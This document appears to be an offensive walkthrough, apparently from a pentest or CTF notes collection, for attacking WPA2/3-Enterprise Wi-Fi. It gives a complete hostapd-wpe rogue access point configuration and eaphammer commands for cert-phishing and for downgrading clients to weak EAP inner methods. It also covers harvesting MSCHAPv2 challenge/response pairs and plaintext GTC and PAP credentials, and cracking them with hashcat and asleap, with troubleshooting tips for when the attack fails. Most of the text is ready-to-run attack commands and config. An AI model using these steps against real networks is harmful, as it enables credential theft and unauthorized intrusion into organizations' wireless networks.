# enterprise — walkthrough

**Verified against:** hostapd-wpe (hostapd 2.10) / eaphammer 1.14 / hashcat 6.2.x as of 2026-Q3

Two engagements. Path A stands up a rogue RADIUS with `hostapd-wpe`
and harvests MSCHAPv2 chal/resp. Path B uses `eaphammer` for cert-
phishing against weak-validation clients and captures plaintext GTC.
Path C is the crack.

## Preconditions

- Target network is WPA2/3-Enterprise (AKM selector in `00-0F-AC:{01,
  03, 05, 0B, 0C, 11}`).
- Rogue AP hardware — Pineapple Mk VII or laptop with a
  monitor+injection adapter.
- Root privileges (RADIUS binds < 1024).

## Path A — hostapd-wpe rogue

The classic. Bring up hostapd with a WPE (Wireless Pwnage Edition)
patch that logs MSCHAPv2 chal/resp.

```
apt install hostapd-wpe

cat > /etc/hostapd-wpe/hostapd-wpe.conf <<EOF
interface=wlan1
ssid=CorporateWiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever
ca_cert=/etc/hostapd-wpe/certs/ca.pem
dh_file=/etc/hostapd-wpe/certs/dh
EOF

hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

`hostapd-wpe` logs captures to `/var/log/hostapd-wpe.log`:

```
username:      alice
challenge:     6f3b...                              # 8-byte ChallengeHash
response:      c8e1f...                             # 24-byte NTResponse
jtr NETNTLM:   alice:$NETNTLM$...
hashcat 5500:  alice::CorporateWiFi::c8e1f...:6f3b... # user::domain::<NTResp>:<ChallengeHash>
```

The `challenge` field is the pre-derived 8-byte `ChallengeHash`
(SHA1(PeerChallenge || AuthenticatorChallenge || Username)[:8]).
Full derivation and hashcat-5500 field spec in the "MSCHAPv2
ChallengeHash derivation" callout of `enterprise/reference.md`.

## Path B — eaphammer cert-phish

Better ergonomics; auto-generates certs matching a target CN.

```
git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer && ./kali-setup

# Generate a cert matching corporate CN
./eaphammer --cert-wizard

# Fire the rogue
./eaphammer -i wlan1 \
  --auth wpa-eap \
  --essid CorporateWiFi \
  --channel 6 \
  --negotiate weakest \
  --creds
```

`--negotiate weakest` offers weak inner methods first (PEAP → GTC
then MSCHAPv2). `--creds` logs to `loot/`.

For clients that require a *specific* CA:

```
# Extract the CA the target trusts (from a profile push or a
# domain-joined machine).
./eaphammer --cert-wizard \
  --ca-key /path/to/target-ca.key \
  --ca-cert /path/to/target-ca.crt
```

## Path C — Crack the MSCHAPv2

```
# hostapd-wpe already emitted a hashcat 5500 line:
hashcat -m 5500 mschapv2.hash rockyou.txt -r best64.rule -w 4

# asleap alternative — same 8-byte ChallengeHash / 24-byte NTResponse
# as the hashcat 5500 fields; not the raw wire challenges. See the
# derivation callout in enterprise/reference.md.
asleap -C <ChallengeHash_hex> -R <NTResponse_hex> -W rockyou.txt
```

## Path D — Capture the plaintext GTC token

If the rogue negotiated GTC, the "response" field in the log is the
plaintext token — that's the flag surface. No crack step.

```
grep -A1 "EAP-GTC" /var/log/hostapd-wpe.log
```

## Path E — EAP-TTLS-PAP plaintext

Rarer, but a target with EAP-TTLS-PAP configured hands you the
plaintext password once the tunnel opens. `hostapd-wpe` logs it as
`username:password` cleartext.

## Failure modes

- **Client validates cert strictly.** EAP tunnel never opens.
  Confirm you have the right CA/CN in your cert. Match the
  organization's issuing CA if possible.
- **Client rejects downgrade.** Some profiles pin the inner method
  (`InnerAuthentication=MSCHAPv2` in an Android profile). If pinning
  is enforced, only that method opens.
- **No RADIUS response reaching the AP side.** Check firewall rules
  on the Pineapple (`iptables -L`). RADIUS port 1812 needs to be
  reachable from hostapd to the local RADIUS daemon.
- **Client uses EAP-TLS (mutual cert).** Neither rogue path applies
  — you'd need the client's private key. Look for a captive-portal
  MDM profile-theft angle instead.

## Cite

- Gabriel Ryan — eaphammer DEFCON/BSides talks.
- hostapd-wpe GitHub — install + config.
- Wright — asleap; hacking-exposed-wireless-3e.
- attacks.json: `rogue-radius-hostapd-wpe`,
  `rogue-radius-eaphammer`,
  `cert-phish-eaphammer-weak-validation`,
  `eap-inner-downgrade-peap-mschapv2`,
  `eap-inner-downgrade-peap-gtc`,
  `hashcat-5500-mschapv2-crack`,
  `asleap-mschapv2-crack`,
  `eap-gtc-plaintext-token-capture`.
